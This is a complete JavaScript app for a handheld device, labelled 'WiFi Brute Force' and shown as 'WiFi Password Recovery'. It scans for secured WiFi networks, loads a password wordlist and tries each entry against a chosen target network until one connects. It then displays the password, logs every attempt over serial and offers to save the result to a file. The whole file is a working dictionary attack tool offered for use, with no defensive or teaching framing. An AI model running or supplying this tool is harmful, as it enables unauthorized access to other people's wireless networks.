var dialog = require("dialog");
var wifi = require("wifi");
var storage = require("storage");
var keyboard = require("keyboard");
var display = require("display");
var serial = require("serial");
var device = require("device");

// WiFi Brute Force - Premium Modern Design
var screenWidth = display.width();
var screenHeight = display.height();

// Premium color scheme - clean and professional
var BG = display.color(240, 242, 245);
var BG_DARK = display.color(220, 225, 230);
var PRIMARY = display.color(0, 122, 255);
var PRIMARY_LIGHT = display.color(100, 170, 255);
var SUCCESS = display.color(52, 199, 89);
var ERROR = display.color(255, 59, 48);
var WARNING = display.color(255, 149, 0);
var TEXT_PRIMARY = display.color(0, 0, 0);
var TEXT_SECONDARY = display.color(100, 100, 105);
var BORDER = display.color(200, 200, 205);
var WHITE = display.color(255, 255, 255);
var ACCENT = display.color(88, 86, 214);

var selectedNetwork = null;
var passwords = [];
var shouldExit = false;

function formatTime(ms) {
  var totalSec = Math.floor(ms / 1000);
  var min = Math.floor(totalSec / 60);
  var sec = totalSec % 60;
  if (min > 0) {
    return min + "m " + sec + "s";
  }
  return sec + "s";
}

function drawHeader(title) {
  // Clean header bar
  display.drawFillRect(0, 0, screenWidth, 20, PRIMARY);
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.drawString(title, screenWidth / 2 - title.length * 3, 6);
}

function drawMainMenu(selected) {
  display.drawFillRect(0, 0, screenWidth, screenHeight, BG);
  drawHeader("WiFi Password Recovery");

  var items = [
    { label: "Select Target Network", icon: ">" },
    { label: "Load Password List", icon: ">" },
    { label: "Start Attack", icon: ">" },
    { label: "Exit", icon: "X" },
  ];

  var startY = 30;
  for (var i = 0; i < items.length; i++) {
    var y = startY + i * 24;
    var isSelected = selected === i;

    // Card-style items
    if (isSelected) {
      display.drawFillRect(10, y, screenWidth - 20, 20, PRIMARY);
      display.setTextColor(WHITE);
    } else {
      display.drawFillRect(10, y, screenWidth - 20, 20, WHITE);
      display.drawRect(10, y, screenWidth - 20, 20, BORDER);
      display.setTextColor(TEXT_PRIMARY);
    }

    display.setTextSize(1);
    display.drawString(items[i].label, 18, y + 6);

    // Status indicator
    if (i === 0 && selectedNetwork) {
      display.setTextColor(isSelected ? WHITE : SUCCESS);
      display.drawString("✓", screenWidth - 20, y + 6);
    } else if (i === 1 && passwords.length > 0) {
      display.setTextColor(isSelected ? WHITE : SUCCESS);
      display.drawString("✓", screenWidth - 20, y + 6);
    }
  }

  // Info footer
  display.setTextColor(TEXT_SECONDARY);
  display.setTextSize(1);
  var infoText = selectedNetwork
    ? selectedNetwork.substring(0, 15)
    : "No target";
  display.drawString(infoText, 10, screenHeight - 20);
  if (passwords.length > 0) {
    display.drawString(passwords.length + " passwords", 10, screenHeight - 10);
  }
}

function scanNetworks() {
  display.drawFillRect(0, 0, screenWidth, screenHeight, BG);
  drawHeader("Scanning Networks");

  display.setTextColor(TEXT_PRIMARY);
  display.setTextSize(1);
  display.drawString("Scanning for WiFi networks...", 10, 35);

  var networks = wifi.scan();
  delay(3000);

  if (!networks || networks.length === 0) {
    dialog.error("No networks found");
    return null;
  }

  var choices = {};
  for (var i = 0; i < networks.length; i++) {
    var net = networks[i];
    if (net.encryptionType !== "OPEN") {
      var sig = net.RSSI > -50 ? "●●●" : net.RSSI > -70 ? "●●○" : "●○○";
      choices[net.SSID + " " + sig] = net.SSID;
    }
  }

  if (Object.keys(choices).length === 0) {
    dialog.error("No secured networks found");
    return null;
  }

  return dialog.choice(choices);
}

function loadDictionary() {
  var filePath = dialog.pickFile("/");
  if (!filePath) return false;

  display.drawFillRect(0, 0, screenWidth, screenHeight, BG);
  drawHeader("Loading Wordlist");

  display.setTextColor(TEXT_PRIMARY);
  display.setTextSize(1);
  display.drawString("Reading file...", 10, 35);

  var content = storage.read(filePath);
  if (!content) {
    dialog.error("Failed to read file");
    return false;
  }

  var lines = content.split("\n");
  passwords = [];
  for (var i = 0; i < lines.length; i++) {
    var pwd = lines[i].replace(/\r/g, "").trim();
    if (pwd && pwd.length >= 8) passwords.push(pwd);
  }

  if (passwords.length === 0) {
    dialog.error("No valid passwords found");
    return false;
  }

  dialog.info("Loaded " + passwords.length + " passwords");
  return true;
}

function drawAttackScreen(current, total, pwd) {
  display.drawFillRect(0, 0, screenWidth, screenHeight, BG);
  drawHeader("Attack in Progress");

  // Progress card
  display.drawFillRect(8, 25, screenWidth - 16, 50, WHITE);
  display.drawRect(8, 25, screenWidth - 16, 50, BORDER);

  // Target network
  display.setTextColor(TEXT_SECONDARY);
  display.setTextSize(1);
  display.drawString("Target:", 12, 30);
  display.setTextColor(TEXT_PRIMARY);
  var netStr =
    selectedNetwork.length > 12
      ? selectedNetwork.substring(0, 9) + "..."
      : selectedNetwork;
  display.drawString(netStr, 50, 30);

  // Progress bar
  var progress = total > 0 ? current / total : 0;
  var barW = screenWidth - 32;
  display.drawRect(12, 45, barW, 8, BORDER);
  display.drawFillRect(13, 46, Math.floor(barW * progress) - 2, 6, PRIMARY);

  // Stats
  display.setTextColor(TEXT_PRIMARY);
  display.drawString(current + " / " + total, 12, 58);
  display.setTextColor(TEXT_SECONDARY);
  display.drawString(Math.floor(progress * 100) + "%", screenWidth - 40, 58);

  // Current attempt card
  display.drawFillRect(8, 80, screenWidth - 16, 30, WHITE);
  display.drawRect(8, 80, screenWidth - 16, 30, BORDER);

  display.setTextColor(TEXT_SECONDARY);
  display.setTextSize(1);
  display.drawString("Testing:", 12, 85);

  display.setTextColor(PRIMARY);
  var pwdStr = pwd.length > 18 ? pwd.substring(0, 15) + "..." : pwd;
  display.drawString(pwdStr, 12, 96);

  // Footer
  display.setTextColor(TEXT_SECONDARY);
  display.drawString("Press ESC to abort", 10, screenHeight - 10);
}

function drawSuccessScreen(pwd, attempts, timeMs) {
  display.drawFillRect(0, 0, screenWidth, screenHeight, BG);

  // Success header
  display.drawFillRect(0, 0, screenWidth, 25, SUCCESS);
  display.setTextColor(WHITE);
  display.setTextSize(2);
  display.drawString("SUCCESS", screenWidth / 2 - 42, 6);

  // Network card
  display.drawFillRect(10, 32, screenWidth - 20, 22, WHITE);
  display.drawRect(10, 32, screenWidth - 20, 22, BORDER);
  display.setTextColor(TEXT_SECONDARY);
  display.setTextSize(1);
  display.drawString("Network:", 14, 36);
  display.setTextColor(TEXT_PRIMARY);
  var netStr =
    selectedNetwork.length > 15
      ? selectedNetwork.substring(0, 12) + "..."
      : selectedNetwork;
  display.drawString(netStr, 14, 44);

  // Stats cards
  display.drawFillRect(10, 58, (screenWidth - 25) / 2, 20, WHITE);
  display.drawRect(10, 58, (screenWidth - 25) / 2, 20, BORDER);
  display.setTextColor(TEXT_SECONDARY);
  display.drawString("Time", 14, 61);
  display.setTextColor(PRIMARY);
  display.drawString(formatTime(timeMs), 14, 69);

  display.drawFillRect(
    screenWidth / 2 + 2,
    58,
    (screenWidth - 25) / 2,
    20,
    WHITE
  );
  display.drawRect(screenWidth / 2 + 2, 58, (screenWidth - 25) / 2, 20, BORDER);
  display.setTextColor(TEXT_SECONDARY);
  display.drawString("Attempts", screenWidth / 2 + 6, 61);
  display.setTextColor(PRIMARY);
  display.drawString("" + attempts, screenWidth / 2 + 6, 69);

  // Password card - highlighted
  display.drawFillRect(10, 84, screenWidth - 20, 26, PRIMARY);
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.drawString("Password:", 14, 88);
  display.setTextSize(2);
  var pwdDisplay = pwd.length > 11 ? pwd.substring(0, 9) + ".." : pwd;
  display.drawString(pwdDisplay, 14, 98);
}

function drawSaveMenu(selected) {
  // Menu overlay in top right
  var menuW = 80;
  var menuH = 50;
  var menuX = screenWidth - menuW - 5;
  var menuY = 5;

  // Shadow effect
  display.drawFillRect(
    menuX + 2,
    menuY + 2,
    menuW,
    menuH,
    display.color(180, 180, 180)
  );

  // Menu background
  display.drawFillRect(menuX, menuY, menuW, menuH, WHITE);
  display.drawRect(menuX, menuY, menuW, menuH, BORDER);

  var items = ["Save", "Don't Save"];

  for (var i = 0; i < items.length; i++) {
    var itemY = menuY + 5 + i * 20;

    if (selected === i) {
      display.drawFillRect(menuX + 2, itemY, menuW - 4, 18, PRIMARY);
      display.setTextColor(WHITE);
    } else {
      display.setTextColor(TEXT_PRIMARY);
    }

    display.setTextSize(1);
    display.drawString(items[i], menuX + 8, itemY + 5);
  }
}

function runAttack() {
  if (!selectedNetwork) {
    dialog.error("Please select a target network");
    return;
  }
  if (passwords.length === 0) {
    dialog.error("Please load a password list");
    return;
  }

  keyboard.setLongPress(true);
  serial.println("==== WiFi Attack Started ====");
  serial.println("Target: " + selectedNetwork);
  serial.println("Passwords: " + passwords.length);

  var startTime = Date.now();

  // Set LED to green
  try {
    device.setLedColor(0, 255, 0);
    serial.println("LED: Green");
  } catch (e) {
    serial.println("LED control unavailable");
  }

  // Disconnect first
  serial.println("Disconnecting...");
  wifi.disconnect();
  delay(500);

  for (var i = 0; i < passwords.length; i++) {
    if (keyboard.getEscPress()) {
      serial.println("Aborted");
      wifi.disconnect();
      try {
        device.setLedColor(255, 255, 255);
      } catch (e) {}
      keyboard.setLongPress(false);
      return;
    }

    var pwd = passwords[i];
    drawAttackScreen(i + 1, passwords.length, pwd);
    serial.println("Try " + (i + 1) + ": " + pwd);

    wifi.disconnect();
    delay(100);

    var connected = false;
    try {
      connected = wifi.connect(selectedNetwork, 5, pwd);
      serial.println("Result: " + connected);
    } catch (e) {
      serial.println("Error: " + e);
      connected = false;
    }

    if (connected) {
      delay(500);
      var isConn = false;
      try {
        isConn = wifi.isConnected();
      } catch (e) {
        isConn = connected;
      }

      if (isConn || connected) {
        var elapsedTime = Date.now() - startTime;

        serial.println("SUCCESS!");
        serial.println("Password: " + pwd);
        serial.println("Time: " + formatTime(elapsedTime));
        serial.println("Attempts: " + (i + 1));

        // Show success screen
        drawSuccessScreen(pwd, i + 1, elapsedTime);

        // Show save menu
        var menuSel = 0;
        var waitingForChoice = true;

        while (waitingForChoice) {
          drawSaveMenu(menuSel);

          if (keyboard.getPrevPress()) {
            menuSel = (menuSel - 1 + 2) % 2;
          }
          if (keyboard.getNextPress()) {
            menuSel = (menuSel + 1) % 2;
          }
          if (keyboard.getSelPress()) {
            if (menuSel === 0) {
              // Save
              var filename =
                "/WiFi_" +
                selectedNetwork.replace(/[^a-zA-Z0-9]/g, "_") +
                ".txt";
              var content = "Network: " + selectedNetwork + "\n";
              content += "Password: " + pwd + "\n";
              content += "Time: " + formatTime(elapsedTime) + "\n";
              content += "Attempts: " + (i + 1) + "\n";
              content += "Date: " + new Date().toString() + "\n";

              try {
                storage.write(filename, content);
                dialog.info("Saved to:\n" + filename);
                serial.println("Saved: " + filename);
              } catch (e) {
                dialog.error("Save failed");
                serial.println("Save error: " + e);
              }
            }
            waitingForChoice = false;
          }
          if (keyboard.getEscPress()) {
            waitingForChoice = false;
          }
          delay(50);
        }

        wifi.disconnect();
        try {
          device.setLedColor(255, 255, 255);
        } catch (e) {}
        keyboard.setLongPress(false);
        return;
      }
    }

    serial.println("Failed");
    delay(50);
  }

  // All passwords tried - failed
  serial.println("Attack finished - no match");

  display.drawFillRect(0, 0, screenWidth, screenHeight, BG);
  display.drawFillRect(0, 0, screenWidth, 25, ERROR);
  display.setTextColor(WHITE);
  display.setTextSize(2);
  display.drawString("FAILED", screenWidth / 2 - 36, 6);

  display.setTextColor(TEXT_PRIMARY);
  display.setTextSize(1);
  display.drawString("Password not in wordlist", 10, 40);
  display.setTextColor(TEXT_SECONDARY);
  display.drawString("Tried: " + passwords.length + " passwords", 10, 55);

  delay(2000);

  wifi.disconnect();
  try {
    device.setLedColor(255, 255, 255);
  } catch (e) {}
  keyboard.setLongPress(false);
}

// Main loop
var menuSel = 0;

while (!shouldExit) {
  drawMainMenu(menuSel);

  while (true) {
    if (keyboard.getPrevPress()) {
      menuSel = (menuSel - 1 + 4) % 4;
      break;
    }
    if (keyboard.getNextPress()) {
      menuSel = (menuSel + 1) % 4;
      break;
    }
    if (keyboard.getSelPress()) {
      if (menuSel === 0) {
        var result = scanNetworks();
        if (result) selectedNetwork = result;
      } else if (menuSel === 1) {
        loadDictionary();
      } else if (menuSel === 2) {
        runAttack();
      } else {
        shouldExit = true;
      }
      break;
    }
    if (keyboard.getEscPress()) {
      shouldExit = true;
      break;
    }
    delay(30);
  }
}
